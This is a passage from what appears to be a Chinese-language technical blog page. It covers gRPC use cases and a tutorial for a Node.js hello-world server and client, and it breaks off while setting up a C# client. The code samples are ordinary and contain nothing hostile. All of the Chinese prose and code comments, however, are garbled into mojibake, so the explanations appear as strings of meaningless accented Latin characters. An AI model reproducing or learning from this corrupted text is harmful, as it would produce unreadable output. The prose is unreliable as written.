æ€§ã€‚<br><strong>è·¨å¹³å°æ”¯æŒ</strong>ï¼šgRPCå¯ä»¥åœ¨å¤šç§ç¯å¢ƒä¸­è¿è¡Œï¼ŒåŒ…æ‹¬äº‘æœåŠ¡ã€æœ¬åœ°éƒ¨ç½²ã€ç§»åŠ¨ç«¯ç­‰ï¼Œå¹¶ä¸”å¯¹å„ç§ç¼–ç¨‹è¯­è¨€éƒ½æœ‰è‰¯å¥½çš„æ”¯æŒï¼Œä¾¿äºæ„å»ºè·¨å¹³å°çš„åº”ç”¨ç¨‹åºã€‚<br><strong>æ’ä»¶ç³»ç»Ÿ</strong>ï¼šgRPCæä¾›äº†ä¸€ä¸ªæ’ä»¶ç³»ç»Ÿï¼Œå…è®¸ç”¨æˆ·è‡ªå®šä¹‰ä»£ç ç”Ÿæˆé€»è¾‘ï¼Œæˆ–è€…æ·»åŠ é¢å¤–çš„åŠŸèƒ½ï¼Œå¦‚è®¤è¯ã€æ—¥å¿—è®°å½•ã€ç›‘æ§ç­‰ã€‚<br><strong>å¼ºå¤§çš„ç¤¾åŒºå’Œç”Ÿæ€ç³»ç»Ÿ</strong>ï¼šç”±äºå®ƒæ˜¯Googleçš„äº§å“å¹¶ä¸”è¢«å¹¿æ³›é‡‡ç”¨ï¼Œå› æ­¤æ‹¥æœ‰ä¸€ä¸ªæ´»è·ƒçš„ç¤¾åŒºå’Œä¸°å¯Œçš„ç¬¬ä¸‰æ–¹åº“ä¸å·¥å…·ç”Ÿæ€ç³»ç»Ÿã€‚</p><h1 id="gRPC-åœºæ™¯ï¼š"><a href="#gRPC-åœºæ™¯ï¼š" class="headerlink" title="gRPC åœºæ™¯ï¼š"></a>gRPC åœºæ™¯ï¼š</h1><p>gRPCçš„ä½¿ç”¨åœºæ™¯éå¸¸å¹¿æ³›ï¼Œå°¤å…¶é€‚ç”¨äºéœ€è¦é«˜æ•ˆã€å¯é å’Œé«˜æ€§èƒ½é€šä¿¡çš„åº”ç”¨ç¨‹åºã€‚ä»¥ä¸‹æ˜¯gRPCçš„ä¸€äº›å…¸å‹ä½¿ç”¨åœºæ™¯ï¼š</p><h2 id="1-å¾®æœåŠ¡æ¶æ„"><a href="#1-å¾®æœåŠ¡æ¶æ„" class="headerlink" title="1. å¾®æœåŠ¡æ¶æ„"></a>1. å¾®æœåŠ¡æ¶æ„</h2><p>æœåŠ¡é—´é€šä¿¡ï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œä¸åŒçš„æœåŠ¡å¯èƒ½ä½¿ç”¨ä¸åŒçš„ç¼–ç¨‹è¯­è¨€å®ç°ï¼Œå¹¶ä¸”éœ€è¦é«˜æ•ˆåœ°ç›¸äº’äº¤æµã€‚gRPCä»¥å…¶è·¨è¯­è¨€æ”¯æŒå’Œé«˜æ•ˆçš„äºŒè¿›åˆ¶åè®®ï¼ˆProtocol Buffersï¼‰ï¼Œæˆä¸ºæ„å»ºå¾®æœåŠ¡ä¹‹é—´é€šä¿¡å±‚çš„ç†æƒ³é€‰æ‹©ã€‚<br>è´Ÿè½½å‡è¡¡ï¼šgRPCåŸç”Ÿæ”¯æŒå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ï¼Œå¯ä»¥å¸®åŠ©åˆ†æ•£è¯·æ±‚åˆ°å¤šä¸ªæœåŠ¡å®ä¾‹ä¸Šï¼Œæé«˜ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œæ€§èƒ½ã€‚</p><h2 id="2-å®æ—¶åº”ç”¨ç¨‹åº"><a href="#2-å®æ—¶åº”ç”¨ç¨‹åº" class="headerlink" title="2. å®æ—¶åº”ç”¨ç¨‹åº"></a>2. å®æ—¶åº”ç”¨ç¨‹åº</h2><p>åŒå‘æµå¼é€šä¿¡ï¼šgRPCçš„åŒå‘æµç‰¹æ€§éå¸¸é€‚åˆç”¨äºå®æ—¶åº”ç”¨ç¨‹åºï¼Œå¦‚èŠå¤©åº”ç”¨ã€åœ¨çº¿æ¸¸æˆã€è§†é¢‘ä¼šè®®ç­‰ï¼Œå…¶ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éœ€è¦æŒç»­åœ°äº¤æ¢æ•°æ®ã€‚<br>å®æ—¶æ•°æ®æ¨é€ï¼šå¯¹äºéœ€è¦ä»æœåŠ¡å™¨å‘å®¢æˆ·ç«¯æ¨é€å®æ—¶æ›´æ–°çš„åº”ç”¨ï¼Œä¾‹å¦‚è‚¡ç¥¨è¡Œæƒ…ã€ç¤¾äº¤åª’ä½“é€šçŸ¥ã€ç‰©è”ç½‘è®¾å¤‡çŠ¶æ€æ›´æ–°ç­‰ï¼ŒgRPCçš„æœåŠ¡ç«¯æµå¼RPCå¯ä»¥æœ‰æ•ˆåœ°å®ç°è¿™ä¸€éœ€æ±‚ã€‚</p><h2 id="3-ç§»åŠ¨åº”ç”¨ä¸åç«¯é€šä¿¡"><a href="#3-ç§»åŠ¨åº”ç”¨ä¸åç«¯é€šä¿¡" class="headerlink" title="3. ç§»åŠ¨åº”ç”¨ä¸åç«¯é€šä¿¡"></a>3. ç§»åŠ¨åº”ç”¨ä¸åç«¯é€šä¿¡</h2><p>è½»é‡çº§æ€§èƒ½ï¼šç”±äºå…¶é«˜æ•ˆçš„åºåˆ—åŒ–æœºåˆ¶å’Œè¾ƒä½çš„ç½‘ç»œå¼€é”€ï¼ŒgRPCç‰¹åˆ«é€‚åˆç§»åŠ¨åº”ç”¨ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œç‰¹åˆ«æ˜¯åœ¨ç½‘ç»œæ¡ä»¶ä¸ä½³çš„æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿå‡å°‘ç”µé‡æ¶ˆè€—å¹¶æé«˜å“åº”é€Ÿåº¦ã€‚<br>å¿«é€Ÿå¼€å‘ï¼šgRPCè‡ªåŠ¨ç”Ÿæˆå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä»£ç çš„èƒ½åŠ›ï¼Œå¤§å¤§ç®€åŒ–äº†å¼€å‘æµç¨‹ï¼Œå°¤å…¶æ˜¯åœ¨å¤šå¹³å°å¼€å‘ç¯å¢ƒä¸­ï¼Œå‡å°‘äº†é‡å¤åŠ³åŠ¨ã€‚</p><h2 id="4-è·¨è¯­è¨€é€šä¿¡"><a href="#4-è·¨è¯­è¨€é€šä¿¡" class="headerlink" title="4. è·¨è¯­è¨€é€šä¿¡"></a>4. è·¨è¯­è¨€é€šä¿¡</h2><p>å¤šè¯­è¨€ç¯å¢ƒï¼šgRPCæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œä½¿å¾—å®ƒéå¸¸é€‚åˆç”¨äºè·¨è¯­è¨€é€šä¿¡çš„åœºæ™¯ã€‚ä¸åŒå›¢é˜Ÿæˆ–é¡¹ç›®å¯ä»¥ä½¿ç”¨å„è‡ªç†Ÿæ‚‰çš„æŠ€æœ¯æ ˆï¼ŒåŒæ—¶é€šè¿‡gRPCè¿›è¡Œæ— ç¼é›†æˆã€‚<br>å¼‚æ„ç³»ç»Ÿé›†æˆï¼šå½“éœ€è¦å°†é—ç•™ç³»ç»Ÿä¸ç°ä»£åº”ç”¨é›†æˆæ—¶ï¼ŒgRPCçš„è·¨è¯­è¨€èƒ½åŠ›å¯ä»¥å¸®åŠ©æ¡¥æ¥è¿™äº›ç³»ç»Ÿï¼Œä¿ƒè¿›ä¿¡æ¯çš„æµåŠ¨å’Œäº¤äº’ã€‚</p><h2 id="5-åˆ†å¸ƒå¼ç³»ç»Ÿ"><a href="#5-åˆ†å¸ƒå¼ç³»ç»Ÿ" class="headerlink" title="5. åˆ†å¸ƒå¼ç³»ç»Ÿ"></a>5. åˆ†å¸ƒå¼ç³»ç»Ÿ</h2><p>èŠ‚ç‚¹é—´é€šä¿¡ï¼šåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå„èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡æ˜¯è‡³å…³é‡è¦çš„ã€‚gRPCæä¾›çš„é«˜æ•ˆç‡å’Œå¯é æ€§ä½¿å…¶æˆä¸ºåˆ†å¸ƒå¼è®¡ç®—ã€ä»»åŠ¡åˆ†å‘ã€é›†ç¾¤ç®¡ç†ç­‰åœºæ™¯ä¸‹çš„é¦–é€‰é€šä¿¡æ¡†æ¶ã€‚<br>æ•°æ®åŒæ­¥ï¼šgRPCå¯ä»¥ç”¨æ¥å®ç°å®æ—¶çš„æ•°æ®åŒæ­¥ï¼Œç¡®ä¿åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½æ‹¥æœ‰æœ€æ–°çš„æ•°æ®å‰¯æœ¬ã€‚</p><h2 id="6-å®¹å™¨åŒ–ç¯å¢ƒ"><a href="#6-å®¹å™¨åŒ–ç¯å¢ƒ" class="headerlink" title="6. å®¹å™¨åŒ–ç¯å¢ƒ"></a>6. å®¹å™¨åŒ–ç¯å¢ƒ</h2><p>æœåŠ¡å‘ç°ï¼šåœ¨Kubernetesç­‰å®¹å™¨ç¼–æ’å¹³å°ä¸Šï¼ŒgRPCå¯ä»¥é€šè¿‡æœåŠ¡å‘ç°æœºåˆ¶è‡ªåŠ¨æ‰¾åˆ°å…¶ä»–æœåŠ¡ï¼Œç®€åŒ–äº†å®¹å™¨é—´çš„é€šä¿¡é…ç½®ã€‚<br>è½»é‡çº§éƒ¨ç½²ï¼šgRPCçš„è½»é‡çº§ç‰¹æ€§å’Œå¯¹å¤šè¯­è¨€çš„æ”¯æŒï¼Œä½¿å…¶éå¸¸é€‚åˆå®¹å™¨åŒ–éƒ¨ç½²ï¼Œæœ‰åŠ©äºæå‡èµ„æºåˆ©ç”¨ç‡å’ŒæœåŠ¡æ‰©å±•æ€§ã€‚</p><h2 id="7-APIåç«¯æœåŠ¡"><a href="#7-APIåç«¯æœåŠ¡" class="headerlink" title="7. APIåç«¯æœåŠ¡"></a>7. APIåç«¯æœåŠ¡</h2><p>é«˜æ€§èƒ½APIï¼šè®¸å¤šå¤§å‹äº’è”ç½‘å…¬å¸ä½¿ç”¨gRPCæ¥æ„å»ºå…¶APIåç«¯æœåŠ¡ï¼Œå› ä¸ºå®ƒæä¾›äº†é«˜æ€§èƒ½ã€å¯æ‰©å±•æ€§å’Œæ˜“äºç»´æŠ¤çš„æ–¹å¼æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ã€‚<br>ç±»å‹å®‰å…¨ï¼šgRPCçš„IDLï¼ˆæ¥å£å®šä¹‰è¯­è¨€ï¼‰å®šä¹‰äº†ä¸¥æ ¼çš„æœåŠ¡å¥‘çº¦ï¼Œä¿è¯äº†æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„è°ƒç”¨æ˜¯ç±»å‹å®‰å…¨çš„ï¼Œå‡å°‘äº†è¿è¡Œæ—¶é”™è¯¯çš„å‘ç”Ÿã€‚</p><h2 id="8-ç‰©è”ç½‘ï¼ˆIoTï¼‰"><a href="#8-ç‰©è”ç½‘ï¼ˆIoTï¼‰" class="headerlink" title="8. ç‰©è”ç½‘ï¼ˆIoTï¼‰"></a>8. ç‰©è”ç½‘ï¼ˆIoTï¼‰</h2><p>ä½èµ„æºæ¶ˆè€—ï¼šgRPCçš„é«˜æ•ˆæ€§èƒ½å’Œç´§å‡‘çš„æ¶ˆæ¯æ ¼å¼ï¼Œä½¿å¾—å®ƒæˆä¸ºè¿æ¥IoTè®¾å¤‡å’Œä¼ æ„Ÿå™¨çš„ç†æƒ³é€šä¿¡åè®®ï¼Œèƒ½å¤Ÿåœ¨æœ‰é™çš„è®¡ç®—å’Œç½‘ç»œèµ„æºä¸‹æä¾›å¯é çš„é€šä¿¡ã€‚<br>å®æ—¶ç›‘æ§ä¸æ§åˆ¶ï¼šgRPCçš„æµå¼APIéå¸¸é€‚åˆç”¨äºå®æ—¶ç›‘æ§å’Œæ§åˆ¶IoTè®¾å¤‡ï¼Œå¦‚æ™ºèƒ½å®¶å±…ç³»ç»Ÿã€å·¥ä¸šè‡ªåŠ¨åŒ–ç­‰åœºæ™¯ã€‚</p><h2 id="9-å¤§æ•°æ®å’Œæœºå™¨å­¦ä¹ "><a href="#9-å¤§æ•°æ®å’Œæœºå™¨å­¦ä¹ " class="headerlink" title="9. å¤§æ•°æ®å’Œæœºå™¨å­¦ä¹ "></a>9. å¤§æ•°æ®å’Œæœºå™¨å­¦ä¹ </h2><p>æ•°æ®ä¼ è¾“ï¼šåœ¨å¤§æ•°æ®å¤„ç†å’Œæœºå™¨å­¦ä¹ è®­ç»ƒè¿‡ç¨‹ä¸­ï¼ŒgRPCå¯ä»¥ç”¨æ¥é«˜æ•ˆåœ°ä¼ è¾“å¤§é‡æ•°æ®ï¼Œç‰¹åˆ«æ˜¯å½“æ•°æ®éœ€è¦åœ¨ä¸åŒçš„è®¡ç®—èŠ‚ç‚¹ä¹‹é—´ä¼ é€’æ—¶ã€‚<br>æ¨¡å‹æœåŠ¡ï¼šgRPCå¸¸è¢«ç”¨äºæ„å»ºæœºå™¨å­¦ä¹ æ¨¡å‹çš„æœåŠ¡åŒ–æ¥å£ï¼Œå…è®¸å®¢æˆ·ç«¯ä»¥é«˜æ•ˆçš„æ–¹å¼æŸ¥è¯¢æ¨¡å‹é¢„æµ‹ç»“æœã€‚<br>ç»¼ä¸Šæ‰€è¿°ï¼ŒgRPCæ˜¯ä¸€ä¸ªçµæ´»ä¸”å¼ºå¤§çš„é€šä¿¡æ¡†æ¶ï¼Œé€‚ç”¨äºå„ç§éœ€è¦é«˜æ•ˆã€å¯é é€šä¿¡çš„åœºæ™¯ã€‚æ— è®ºæ˜¯æ„å»ºå¤æ‚çš„å¾®æœåŠ¡æ¶æ„ï¼Œè¿˜æ˜¯ç®€å•çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åº”ç”¨ï¼ŒgRPCéƒ½èƒ½æä¾›æ˜¾è‘—çš„ä¼˜åŠ¿ã€‚</p><h1 id="Node-js-gRPC"><a href="#Node-js-gRPC" class="headerlink" title="Node.js gRPC"></a>Node.js gRPC</h1><p> åˆ›å»ºå’Œè°ƒç”¨ gRPC æœåŠ¡ã€‚åŒ…æ‹¬æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å®ç°ã€‚</p><h2 id="1-å®‰è£…å¿…è¦çš„åŒ…"><a href="#1-å®‰è£…å¿…è¦çš„åŒ…" class="headerlink" title="1. å®‰è£…å¿…è¦çš„åŒ…"></a>1. å®‰è£…å¿…è¦çš„åŒ…</h2><p>åœ¨é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… gRPC ç›¸å…³ä¾èµ–ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install @grpc/grpc-js @grpc/proto-loader</span><br></pre></td></tr></table></figure><h2 id="2-åˆ›å»º-proto-æ–‡ä»¶"><a href="#2-åˆ›å»º-proto-æ–‡ä»¶" class="headerlink" title="2. åˆ›å»º proto æ–‡ä»¶"></a>2. åˆ›å»º proto æ–‡ä»¶</h2><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ example.proto å®šä¹‰ gRPC æœåŠ¡å’Œæ¶ˆæ¯ç»“æ„ï¼š</p><p>proto</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">service <span class="title class_">ExampleService</span> &#123;</span><br><span class="line">  rpc <span class="title class_">SayHello</span> (<span class="title class_">HelloRequest</span>) returns (<span class="title class_">HelloReply</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message <span class="title class_">HelloRequest</span> &#123;</span><br><span class="line">  string name = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message <span class="title class_">HelloReply</span> &#123;</span><br><span class="line">  string message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-å®ç°-gRPC-æœåŠ¡å™¨"><a href="#3-å®ç°-gRPC-æœåŠ¡å™¨" class="headerlink" title="3. å®ç° gRPC æœåŠ¡å™¨"></a>3. å®ç° gRPC æœåŠ¡å™¨</h2><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ server.jsï¼Œå®ç° gRPC æœåŠ¡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> grpc = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/grpc-js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> protoLoader = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/proto-loader&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ è½½ proto æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROTO_PATH</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;example.proto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> packageDefinition = protoLoader.<span class="title function_">loadSync</span>(<span class="variable constant_">PROTO_PATH</span>, &#123;</span><br><span class="line">  <span class="attr">keepCase</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">longs</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">enums</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">defaults</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">oneofs</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> exampleProto = grpc.<span class="title function_">loadPackageDefinition</span>(packageDefinition);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° SayHello æ–¹æ³•</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params">call, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> name = call.<span class="property">request</span>.<span class="property">name</span>;</span><br><span class="line">  <span class="title function_">callback</span>(<span class="literal">null</span>, &#123; <span class="attr">message</span>: <span class="string">`Hello, <span class="subst">$&#123;name&#125;</span>!`</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå’Œå¯åŠ¨ gRPC æœåŠ¡å™¨</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> server = <span class="keyword">new</span> grpc.<span class="title class_">Server</span>();</span><br><span class="line">  server.<span class="title function_">addService</span>(exampleProto.<span class="property">ExampleService</span>.<span class="property">service</span>, &#123; <span class="title class_">SayHello</span>: sayHello &#125;);</span><br><span class="line">  <span class="keyword">const</span> port = <span class="string">&#x27;127.0.0.1:50051&#x27;</span>;</span><br><span class="line">  server.<span class="title function_">bindAsync</span>(port, grpc.<span class="property">ServerCredentials</span>.<span class="title function_">createInsecure</span>(), <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// ä¸å†éœ€è¦è°ƒç”¨ server.start()</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h2 id="4-å®ç°-gRPC-å®¢æˆ·ç«¯"><a href="#4-å®ç°-gRPC-å®¢æˆ·ç«¯" class="headerlink" title="4. å®ç° gRPC å®¢æˆ·ç«¯"></a>4. å®ç° gRPC å®¢æˆ·ç«¯</h2><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ client.jsï¼Œè°ƒç”¨ gRPC æœåŠ¡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> grpc = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/grpc-js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> protoLoader = <span class="built_in">require</span>(<span class="string">&#x27;@grpc/proto-loader&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ è½½ proto æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROTO_PATH</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;example.proto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> packageDefinition = protoLoader.<span class="title function_">loadSync</span>(<span class="variable constant_">PROTO_PATH</span>, &#123;</span><br><span class="line">  <span class="attr">keepCase</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">longs</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">enums</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">defaults</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">oneofs</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> exampleProto = grpc.<span class="title function_">loadPackageDefinition</span>(packageDefinition);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå®¢æˆ·ç«¯å¹¶è°ƒç”¨æœåŠ¡</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> client = <span class="keyword">new</span> exampleProto.<span class="title class_">ExampleService</span>(<span class="string">&#x27;127.0.0.1:50051&#x27;</span>, grpc.<span class="property">credentials</span>.<span class="title function_">createInsecure</span>());</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">&#x27;World&#x27;</span>;</span><br><span class="line">  client.<span class="title class_">SayHello</span>(&#123; name &#125;, <span class="function">(<span class="params">error, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server Response:&#x27;</span>, response.<span class="property">message</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><h2 id="5-è¿è¡Œç¤ºä¾‹"><a href="#5-è¿è¡Œç¤ºä¾‹" class="headerlink" title="5. è¿è¡Œç¤ºä¾‹"></a>5. è¿è¡Œç¤ºä¾‹</h2><p>å¯åŠ¨æœåŠ¡å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node server.js</span><br></pre></td></tr></table></figure><p>åœ¨å¦ä¸€ä¸ªç»ˆç«¯çª—å£è¿è¡Œå®¢æˆ·ç«¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node client.js</span><br></pre></td></tr></table></figure><p>åœ¨å®¢æˆ·ç«¯ç»ˆç«¯çœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server Response: Hello, World!</span><br></pre></td></tr></table></figure><p>proto æ–‡ä»¶ï¼šç”¨äºå®šä¹‰æœåŠ¡å’Œæ¶ˆæ¯ç»“æ„ã€‚<br>æœåŠ¡å™¨ï¼šé€šè¿‡ grpc.Server åˆ›å»ºå¹¶å®ç°æœåŠ¡æ–¹æ³•ã€‚<br>å®¢æˆ·ç«¯ï¼šé€šè¿‡ grpc.Client è°ƒç”¨æœåŠ¡å¹¶å¤„ç†å“åº”ã€‚<br>å¯ä»¥åŸºäºæ­¤ç¤ºä¾‹æ‰©å±•è‡ªå·±çš„ gRPC æœåŠ¡åŠŸèƒ½ã€‚</p><h1 id="C-ç¼–å†™çš„-gRPC-å®¢æˆ·ç«¯"><a href="#C-ç¼–å†™çš„-gRPC-å®¢æˆ·ç«¯" class="headerlink" title="C#ç¼–å†™çš„ gRPC å®¢æˆ·ç«¯"></a>C#ç¼–å†™çš„ gRPC å®¢æˆ·ç«¯</h1><h2 id="1-æ·»åŠ ä¾èµ–"><a href="#1-æ·»åŠ ä¾èµ–" class="headerlink" title="1. æ·»åŠ ä¾èµ–"></a>1. æ·»åŠ ä¾èµ–</h2><p>åœ¨çš„ C# é¡¹ç›®ä¸­ï¼Œæ·»åŠ ä»¥ä¸‹ NuGet åŒ…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dotnet add package Grpc.Net.Client</span><br><span class="line">dotnet add package Grpc.Tools</span><br><span class="line">dotnet add package google.protobuf</span><br></pre></td></tr></table></figure><h2 id="2-é…ç½®-example-proto"><a href="#2-é…ç½®-example-proto" class="headerlink" title="2. é…ç½® example.proto"></a>2. é…ç½® example.proto</h2><p>å°† example.proto æ–‡ä»¶æ·»åŠ åˆ°çš„ C# é¡¹ç›®ä¸­ï¼Œå¹¶ç¼–è¾‘ .csproj æ–‡ä»¶ä»¥ç”Ÿæˆå®¢æˆ·ç«¯ä»£ç ã€‚æ·»åŠ ä»¥ä¸‹å†…å®¹åˆ° <Project> èŠ‚ç‚¹ä¸­ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Protobuf</span> <span class="attr">Include</span>=<span class="string">&quot;example.proto&quot;</span> <span class="attr">GrpcServices</span>=<span class="string">&quot;Client&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™å°†å‘Šè¯‰ç¼–è¯‘å™¨æ ¹æ® example.proto æ–‡ä»¶ç”Ÿæˆ C# å®¢æˆ·ç«¯ä»£ç ã€‚</p><h2 id="3-ç¼–å†™å®¢æˆ·ç«¯ä»£ç "><a href="#3-ç¼–å†™å®¢æˆ·ç«¯ä»£ç " class="headerlink" title="3. ç¼–å†™å®¢æˆ·ç«¯ä»£ç "></a>3. ç¼–å†™å®¢æˆ·ç«¯ä»£ç </h2><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ Program.csï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> Grpc.Net.Client;</span><br><span class="line"><span class="keyword">using</span> Example;</span><br><span class="line"></span><br><span 